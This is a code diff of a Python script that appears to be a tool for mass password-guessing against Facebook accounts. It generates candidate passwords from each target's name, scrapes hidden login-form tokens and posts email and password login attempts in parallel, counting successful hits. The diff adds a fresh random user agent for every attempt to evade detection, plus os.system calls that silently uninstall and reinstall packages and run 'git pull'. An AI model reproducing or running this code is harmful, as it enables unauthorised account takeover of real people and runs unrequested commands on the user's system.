@@ -1,8 +1,21 @@
-import datetime
-import os, re, sys, uuid, random, requests, time, json
-import string
-from concurrent.futures import ThreadPoolExecutor as ThreadPool
+import os, sys, uuid, re, random, time, string, json, base64
+from io import BytesIO
 
+try:
+
+    os.system(
+        'pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
+    import requests, rich, certifi, pycurl
+except:
+    os.system("git pull")
+
+    os.system("pip3 install requests rich certifi pycurl")
+
+    import requests, rich, certifi, pycurl
+
+from rich import print
+from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
 
 def windows():
     aV = str(random.choice(range(10, 20)))
@@ -116,10 +129,6 @@ class sort:
         return cx
 
 
-month = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July",
-         "08": "August", "09": "September", "10": "October", "11": "November", "12": "December", }
-today_data = str(datetime.now()).split(" ")[0].split("-")
-today = today_data[2] + "\x1b[1;97m." + month.get(today_data[1])
 
 
 def filee():
@@ -202,10 +211,10 @@ def filee():
 def file_sub(uid, pwx, name, meth, file, fb):
     global oks, loop, sys_ua
     session = requests.session()
-    shadid = random.choice(sys_ua)
+
     try:
         sys.stdout.write(
-            f"\r\x1b[38;1;196m\x1b[38;0;196m└\x1b[38;1;196m\x1b[38;0;196m\033[38;5;46m[{sort.color()}{today}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90m{loop}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90mOK:{str(len(oks))}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90m{'{:.1%}'.format(loop / len(file))}\033[38;5;46m] \r")
+            f"\r\x1b[38;1;196m\x1b[38;0;196m└\x1b[38;1;196m\x1b[38;0;196m\033[38;5;46m[{sort.color()}M{meth}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90m{loop}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90mOK:{str(len(oks))}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90m{'{:.1%}'.format(loop / len(file))}\033[38;5;46m] \r")
         sys.stdout.flush()
         fs = name.split(' ')[0]
         try:
@@ -213,7 +222,7 @@ def file_sub(uid, pwx, name, meth, file, fb):
         except:
             ls = fs
         for pw in pwx:
-
+            shadid = ua()
             ps = pw.replace('first', fs.lower()).replace('First', fs).replace('last', ls.lower()).replace('Last',
                                                                                                           ls).replace(
                 'Name', name).replace('name', name.lower())
@@ -224,7 +233,7 @@ def file_sub(uid, pwx, name, meth, file, fb):
                     "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                     "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1), "try_number": "0",
                     "unrecognized_tries": "0", "email": uid, "pass": ps, "login": "Log In"}
-            uax = agent
+            uax = shadid
             ver1 = str(random.randrange(1, 99))
             ver2 = str(random.randrange(90, 121))
             lsd = lsb()
